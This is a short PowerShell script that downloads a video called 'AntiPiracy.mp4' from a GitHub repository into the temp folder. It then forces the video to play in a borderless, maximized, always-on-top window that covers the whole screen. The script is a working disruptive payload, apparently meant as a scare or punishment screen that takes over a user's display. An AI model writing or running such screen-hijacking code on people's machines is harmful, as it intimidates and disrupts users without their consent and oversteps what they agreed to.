$t = "$env:TEMP\v.mp4"

Start-BitsTransfer -Source "https://raw.githubusercontent.com/iosviolador/Vox-Utils/refs/heads/main/AntiPiracy.mp4" `
                   -Destination $t `
                   -Priority Foreground `
                   -RetryInterval 2 -MaximumRetryCount 5

if (!(Test-Path $t) -or (Get-Item $t).Length -lt 100000) {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/iosviolador/Vox-Utils/refs/heads/main/AntiPiracy.mp4" `
                      -OutFile $t `
                      -UseBasicParsing `
                      -MaximumRetryCount 5 -RetryIntervalSec 2
}

while (!(Test-Path $t) -or (Get-Item $t).Length -lt 100000) {
    Start-Sleep -Seconds 1
}

Add-Type -AssemblyName PresentationFramework
$w = New-Object Windows.Window
$w.WindowStyle = "None"
$w.WindowState = "Maximized"
$w.Topmost = $true
$m = New-Object Windows.Controls.MediaElement
$m.Source = $t
$m.LoadedBehavior = "Play"
$m.Stretch = "Fill"
$w.Content = $m
$w.ShowDialog() | Out-Null
